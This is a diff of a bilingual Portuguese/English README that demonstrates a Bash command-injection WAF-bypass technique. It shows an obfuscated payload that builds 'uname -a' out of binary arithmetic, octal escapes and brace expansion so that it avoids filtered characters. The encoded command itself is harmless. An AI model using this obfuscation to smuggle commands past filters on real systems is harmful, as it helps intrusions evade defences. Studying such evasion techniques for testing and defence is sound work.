@@ -3,10 +3,13 @@ Bash Command Injection using binary / Injeção de Comando no Bash utilizando bi
 
 <img src="bash command injection waf bypass.png" align="center">
 
-> O que eu fiz, utilizando a vírgula `,` do **Brace Expansion** como um espaço. (`uname -a`)
-```bash
-${!##\-}<<<{\$\'\\$(($((1<<1))#10100101))\\$(($((1<<1))#10011100))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10011011))\\$(($((1<<1))#10010001))\',\$\'\\$(($((1<<1))#110111))\\$(($((1<<1))#10001101))\'}
+> O que eu fiz, utilizando a vírgula `,` do **Brace Expansion** como um espaço. <br>
+> O comando é `uname -a`. (Ignore o `$` antes do `${!##\-}`, é só pelo Syntax Highlight)
+```console
+$ ${!##\-}<<<{\$\'\\$(($((1<<1))#10100101))\\$(($((1<<1))#10011100))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10011011))\\$(($((1<<1))#10010001))\',\$\'\\$(($((1<<1))#110111))\\$(($((1<<1))#10001101))\'}
 ```
+
+<br>
 
 <br>
 
